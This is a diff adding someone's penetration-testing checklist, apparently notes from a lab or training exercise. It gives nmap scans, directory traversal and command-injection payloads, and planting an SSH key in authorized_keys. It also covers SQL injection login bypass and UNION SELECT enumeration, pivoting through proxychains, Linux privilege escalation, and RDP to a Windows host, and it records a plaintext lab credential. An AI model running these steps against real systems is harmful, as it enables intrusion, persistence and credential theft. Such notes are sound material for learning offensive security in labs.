@@ -1,0 +1,69 @@
+Rx target IP
+
+nmap -sT -Pn <target> --open # nothing will be over 5000 for port
+
+Browse target IP - confirm web server
+use nmap <ip> -p port --scripts --http-enum
+check robots.txt
+view landing page --> middle click all links
+view source
+
+myfile=? --> directory traversal or command injection
+--> check both ../../../../../../../../etc/hosts
+--> ; ls -la
+    --> ; ls -la /var/www/html (will enumerate the rest of the website)
+    ====RSA Key Injection==== (situation dependant)
+    ssh-keygen -t rsa
+    ; whoami
+    ; /etc/passwd --> identify root folder for web user
+    ; mkdir <home>/.ssh
+    ; echo "<yourRSA.pub>" > <home>/.ssh/authorized_keys
+    ---> ssh as the web user (www-data?) @<ip> -i rsa -D 9050
+    =========================
+
+exhaust all options from checklist before moving on
+
+Login page
+tom' or 1='1 in both user/pass
+F12 --> inspector --> change post to get in form
+
+from --http-enum: /scripts/ --> has a valid ssh login
+
+Once SSH --> run bash (or /bin/bash)
+/etc/hosts
+ping sweep for new hosts --> 192.168.28.<181/172>
+
+proxychains nmap again
+80 open --> http enum
+
+browse to website (proxy on)
+check robots.txt
+interact with site
+--> returning sql responses, 3 columns
+view page source 
+url - pick.php?product=1&Submit=Submit
+-----------------------> drop the Submit=Submit
+work through the products with product=<1> or 1=1 ==> 7 {verify vuln}
+product=7 UNION SELECT 1,2,3 ==> Verify columns
+===GOLDEN STATEMENT===
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns 
+======================
+get the users information --> contains passwords (ROT13 in this case)
+
+proxychains nmap on 192.168.28.172
+SSH to the .172 (Aaron::apasswordyPa$$word)
+hostname
+===LINUX PRIV ESC===
+sudo -l (gtfobins) --> use absolute paths for the binary 
+find / -perm /4000 2>/dev/null (2000 and 6000 are also viable, but keep list short)
+====================
+once root --> /bin/bash
+ping sweep network --> new windows host
+proxychains nmap against windows host 
+
+connect RDP to windows host
+xfreerdp /v:<ip>:<port> /u:<username> /p:<password> +clipboard
+Task Scheduler
+    Task Scheduler Library
+    --> Work (3rd party, running as system, running every minute)
+
